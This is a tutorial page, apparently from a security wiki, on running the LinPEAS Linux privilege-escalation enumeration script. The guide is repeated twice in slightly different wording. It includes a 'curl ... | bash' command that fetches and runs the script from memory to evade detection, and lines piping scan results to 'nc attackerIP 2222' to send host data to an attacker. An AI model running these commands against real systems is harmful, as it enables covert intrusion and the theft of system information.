---
icon: pear
---

# LinPeas

## The LinPEAS Masterclass: Professional Linux Privilege Escalation & Post-Exploitation Enumeration

LinPEAS is a leading automated script for Linux privilege escalation, providing exhaustive checks for misconfigurations, vulnerabilities, weak permissions, and escalation vectors. It’s vital in post-exploitation, CTFs, and red teaming—rapidly generating actionable leads from compromised hosts.

***

### I. Environment Setup: Dynamic Variables

Prepare dynamic environment/session variables for organized testing:

```bash
export TARGET_PATH="/tmp/linpeas.sh"
export OUTPUT_DIR="linpeas-results"
export OUTPUT_FILE="$OUTPUT_DIR/scan.txt"
export OUTPUT_HTML="$OUTPUT_DIR/scan.html"
export OUTPUT_JSON="$OUTPUT_DIR/scan.json"
export FILTER="full"     # Use "full" for comprehensive, or restrict outputs with -o option
export LISTENER_PORT=2222
export CUSTOM_OPTIONS="-s" # Stealth mode, -a all, -o <section> only

```

***

### II. Core Capabilities & Workflow

* **Exhaustive Privilege Escalation Checks:** Identifies SUID/SGID binaries, weak/crontab/service configurations, writable files, dangerous capabilities, outdated/ vulnerable packages, and kernel exploits.\[1]\[2]\[3]\[4]\[5]
* **Color-Coded Output:** Highlights critical (red/yellow) and informational (green/blue) findings for rapid triage.\[6]\[1]
* **Modular Section Scans:** Run focused scans for specific vectors—users, procs, services, network, containers, cloud, filesystem—using -o option.\[7]
* **Stealth & Memory Execution:** Can be run directly from memory (download and bash via stdin) to minimize disk artifacts and evade detection.\[8]
* **Remote Output Collection:** Support for redirecting output to listeners for off-host analysis.\[8]
* **Integration-Friendly:** Output is compatible with report pipelines, audit reviews, or instant privilege escalation attempts.
* **Continuous Updates:** Actively maintained and expands checks with emerging kernel, container, and cloud security threats.\[9]
* **Cross-Platform:** Linux, Unix, macOS, container, and cloud focused.\[3]\[7]

***

### III. Professional Usage Examples

#### 1. Full Privilege Escalation Scan (Interactive)

```bash
chmod +x $TARGET_PATH
$TARGET_PATH | tee "$OUTPUT_FILE"

```

#### 2. Stealth Run from Memory (No Disk Write)

```bash
curl -sL <https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh> | bash | tee "$OUTPUT_FILE"

```

#### 3. Sectioned Scan (e.g., Only Filesystem)

```bash
$TARGET_PATH -o filesystem | tee "$OUTPUT_FILE"

```

#### 4. Container & Cloud-Specific Enumeration

```bash
$TARGET_PATH -o container | tee "$OUTPUT_DIR/container.txt"
$TARGET_PATH -o cloud | tee "$OUTPUT_DIR/cloud.txt"

```

#### 5. Remote Output (Collect Back to Attacker Listener)

```bash
$TARGET_PATH | nc attackerIP $LISTENER_PORT

```

#### 6. HTML/JSON Export for Reporting

_Parse the output into HTML/JSON using custom tools or terminal scripts for submission or dashboard integration._

***

### IV. Advanced Techniques & Scenarios

* **Filter by Section:** Enumerate targeted areas (users, services, processes, network) for rapid escalation or triage.\[1]\[7]
* **Stealth Ops & Memory Execution:** Avoid dropping files on disk for OPSEC-critical engagements; use interpreter pipelines.\[8]
* **Automate Output Processing:** Combine with grep/awk/sed or log parsers to prioritize red/yellow findings for immediate escalation attempts.
* **Post-Exploitation Pivoting:** Feed LinPEAS results into exploit scripts, privesc binaries, or audit dashboards for action and remediation.\[5]\[3]
* **Cloud/Container Assessment:** Leverage -o options for modern infrastructure enumeration (Kubernetes, Docker, AWS, etc.).\[7]
* **Continuous Monitoring:** Periodically rerun LinPEAS for drift and newly introduced misconfigurations on critical systems.\[9]

***

### V. Real-World Workflow Example

1. **Upload and Run LinPEAS**

```bash
scp linpeas.sh user@target:/tmp/linpeas.sh
ssh user@target
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee "/tmp/linpeas_report.txt"

```

1. **Stealth Run, Remote Collect**

```bash
curl -sL <https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh> | bash | nc attackerIP 2222

```

1. **Section-Focused Scan for Targeted Paths**

```bash
/tmp/linpeas.sh -o procs_crons_timers_srvcs_sockets | tee "$OUTPUT_DIR/services.txt"

```

1. **Manual Review and Exploitation/Reporting**

* Red/yellow findings → exploit attempts, patch/mitigation, submission in reports.

***

### VI. Pro Tips & Best Practices

* Prioritize analysis of red/yellow highlights—a high likelihood of actual privilege escalation.\[6]
* Run as root (if available) for deeper coverage, or escalate with found vectors.
* Regularly update LinPEAS for new checks and threat coverage.\[9]
* Use -o sections to laser-focus on relevant infrastructure/attack vectors.
* Parse LinPEAS output in real time to guide exploitation or remediation.
* Use memory-only execution in sensitive environments and regularly schedule for monitoring.
* Always document findings for audit, compliance, or incident response reporting.

***

This LinPEAS guide equips penetration testers and defenders to rapidly, comprehensively, and stealthily enumerate escalation paths—accelerating post-exploitation, CTF, bug bounty, and infrastructure security workflows.# The LinPEAS Masterclass: Professional Linux Privilege Escalation & Enumeration\[3]\[5]\[1]\[6]\[7]\[8]\[9]

LinPEAS is a state-of-the-art automated script designed to comprehensively enumerate Linux hosts for privilege escalation vectors, vulnerabilities, and misconfigurations. It is essential for post-exploitation, CTFs, red team operations, and internal audits.

***

### Core Capabilities & Workflow

* **Privilege Escalation Checks:** Probes for SUID/SGID binaries, writable files, kernel exploits, weak/crontab/service configs, dangerous capabilities, and vulnerable/outdated packages.\[5]\[1]\[3]
* **Color-Coded Output:** Clearly distinguishes critical, high, moderate, informational findings for rapid triage.\[6]
* **Focused Section Scans:** Can target specific vectors (users, procs, services, network, containers, cloud) with the `o` option.\[7]
* **Stealth/Memory Execution:** Runs directly from memory for operational stealth; can redirect output to a remote listener to avoid forensic detection.\[8]
* **Reporting & Integration:** Output is machine- and human-friendly—parse, grep, export as text for audit, report, exploit.\[7]\[9]
* **Continuous Update:** Maintained to stay current with new Linux and cloud/container vulnerabilities.\[9]

***

### Professional Usage Examples

*   Full scan and tee output interactively:

    ```bash
    linpeas.sh | tee linpeas-results/scan.txt

    ```
*   Stealth run, memory-only (no file on disk):

    ```bash
    curl -sL <https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh> | bash | tee linpeas-results/scan.txt

    ```
*   Scan only for services/cron/processes:

    ```bash
    linpeas.sh -o procs_crons_timers_srvcs_sockets | tee linpeas-results/services.txt

    ```
*   Container/Cloud enumeration:

    ```bash
    linpeas.sh -o container | tee linpeas-results/container.txt
    linpeas.sh -o cloud | tee linpeas-results/cloud.txt

    ```
*   Remote output collection for forensics/off-host review:

    ```bash
    linpeas.sh | nc attackerIP 2222

    ```

***

### Advanced Techniques & Scenarios

* **Section filters** target scans for specific infrastructure or attack surfaces (`o users_information`, `o network_information`, etc.).\[7]
* **Automated output parsing**: Use grep, awk for instant prioritization of critical findings.
* **Repeat scans for drift/monitoring**: Schedule LinPEAS runs to catch new misconfigurations introduced post-updates on critical Linux assets.\[9]
* **Exploit chain pivoting**: Directly use LinPEAS output to select and launch exploit binaries or scripts informed by discovered weaknesses.

***

### Pro Tips & Best Practices

* Focus on red/yellow highlights for actionable privilege escalation leads.\[6]
* Run as root if possible for deeper enumeration.
* Regularly update the LinPEAS script for new misconfiguration/emerging exploit checks.\[9]
* Stealth/memory-execute on sensitive engagements—minimize disk artifacts.\[8]
* Parse and archive findings for audit, compliance, reporting, and incident response.
* Integrate into post-exploitation workflow with privesc, report, remediation stages.

***

This guide empowers penetration testers with rapid, comprehensive, and stealthy enumeration for Linux privilege escalation and system hardening.\[1]\[3]\[5]\[6]\[7]\[8]\[9]

Sources \[1] Practical Guide to Using LinPEAS for Linux Privilege ... [https://osintteam.blog/practical-guide-to-using-linpeas-for-linux-privilege-escalation-a7c753dd5293](https://osintteam.blog/practical-guide-to-using-linpeas-for-linux-privilege-escalation-a7c753dd5293) \[2] What is LinPEAS? - HowToNetwork [https://www.howtonetwork.com/certifications/security/what-is-linpeas/](https://www.howtonetwork.com/certifications/security/what-is-linpeas/) \[3] Post-Exploitation Privilege Escalation Tools | Ethical Hacking [https://armur.ai/ethical-hacking/post/post-1/post-exploitation-privilege-escalation-tools/](https://armur.ai/ethical-hacking/post/post-1/post-exploitation-privilege-escalation-tools/) \[4] Lab 86 – How to enumerate for privilege escalation on a ... [https://www.101labs.net/comptia-security/lab-86-how-to-enumerate-for-privilege-escalation-on-a-linux-target-with-linpeas/](https://www.101labs.net/comptia-security/lab-86-how-to-enumerate-for-privilege-escalation-on-a-linux-target-with-linpeas/) \[5] LinPEAS - HackDB [https://hackdb.com/item/linpeas](https://hackdb.com/item/linpeas) \[6] Linpeas For Linux Security - Lesson and Lab [https://www.youtube.com/watch?v=GY7dtgDgDKg](https://www.youtube.com/watch?v=GY7dtgDgDKg) \[7] Linux Enumeration with LinPEAS - GitHub Pages[https://cr0mll.github.io/cyberclopaedia/Post](https://cr0mll.github.io/cyberclopaedia/Post) Exploitation/Enumeration/Linux/index.html \[8] Stealthy linux enumeration - Stealth Penetration Testing ... [https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration) \[9] PEASS - Privilege Escalation Awesome Scripts SUITE ... [https://github.com/peass-ng/PEASS-ng](https://github.com/peass-ng/PEASS-ng)
